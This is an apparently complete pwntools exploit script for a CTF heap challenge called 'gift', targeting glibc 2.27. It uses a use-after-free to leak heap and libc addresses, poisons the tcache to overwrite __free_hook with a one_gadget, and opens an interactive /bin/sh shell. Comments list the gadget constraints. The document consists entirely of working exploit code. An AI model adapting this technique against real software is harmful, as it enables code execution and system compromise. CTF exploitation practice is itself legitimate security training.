from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node4.anna.nssctf.cn",28973)
io=process("./gift")
libc=ELF("./libc-2.27.so")

def add(n,cc):
    io.sendlineafter(b"choice:\n",b"2")
    io.sendlineafter(b"choice:\n",str(n))
    io.sendlineafter(b"gift!\n",cc)

def delete(n):
    io.sendlineafter(b"choice:\n",b"3")
    io.sendlineafter(b"index?\n",str(n))

def show(n):
    io.sendlineafter(b"choice:\n",b"4")
    io.sendlineafter(b"index?\n",str(n))

def edit_off(n,s):
    io.sendlineafter(b"choice:\n",b"5")
    io.sendlineafter(b"index?\n",str(n))
    io.sendlineafter(b"much?\n",str(s))

gdb.attach(io)
pause()

add(1,b"\x00") #0x100 0
add(1,b"\x00") #0x100 1
delete(0)
delete(1)

show(1)
io.recvuntil(b"cost: ")
heap_addr=int(io.recv(14),10)-0x260
print("heap_addr: "+hex(heap_addr))

add(1,cyclic(0x10)+p64(heap_addr+0x400)+cyclic(0x68)+p64(heap_addr+0x410)) #1
add(1,p64(heap_addr+0x390)) #0

delete(0)
delete(1)
edit_off(1,-0x10)

add(1,b"\x00")
add(1,b"\x00")
add(1,b"\x00")

delete(0)
show(0)

io.recvuntil(b"cost: ")
leak_addr=int(io.recv(16),10)-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))

one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]
free_hook=leak_addr+libc.sym[b"__free_hook"]
sys_addr=leak_addr+libc.sym[b"system"]

add(1,p64(free_hook-0x10))
add(1,b"\x00")
add(1,p64(shell))

delete(1)

io.interactive()

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL